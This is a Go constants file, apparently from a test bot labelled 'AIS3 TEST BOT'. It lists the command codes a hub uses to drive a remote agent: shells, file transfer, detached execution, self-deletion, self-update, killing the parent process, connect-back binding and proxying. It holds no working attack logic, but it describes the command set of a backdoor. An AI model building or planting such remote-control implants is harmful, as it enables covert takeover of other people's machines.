package base

const (

	// initial
	initKeyTag = "HELLO"

	// Agent
	adminAgentTag = "AIS3 TEST TOOL"
	clientAgentTag = "AIS3 TEST BOT"

)


// ops for admin to hub
const (
	H_ls      = "l"
	H_sync    = "syn"
	H_fetch   = "f"
	H_select  = "s"
)

// ops for client
const (
	B_shk     = "sk"   // shell without exit
	B_shs     = "sh"   // shell server
	B_csh     = "csh"  // shell with option

	B_fs      = "fs"  // file ops
	B_push    = "put"  // pipe client to file
	B_get     = "get"  // pipe file to client
	B_del     = "del"  // del file
	B_pipe    = "pipe"  // pipe file and client TODO
	B_call    = "call" // exec file & detach

	B_dodaemon   = "daemon" // do daemon
	B_apoptosis  = "apoptosis" // remove self
	B_rebirth    = "rebirth" // write & exec self
	B_evolution  = "evolution" // update self

	B_ppend      = "ppend"    // send SIGTERM to parent process
	B_ppkill     = "ppkill"   // send SIGKILL to parent process (FC)
	B_psig       = "psig"     // send Signal to process

	B_bind     = "bind"  // bind port on client and connect back

	B_info     = "info"    // pull info
	B_fast0    = "j"    // fast proxy server
	B_fast1    = "k"    // fast proxy server
	B_fast2    = "l"    // fast proxy server
	B_reconn   = "reconn"    // reconnect
	B_kill     = "bye"    // kill self
)

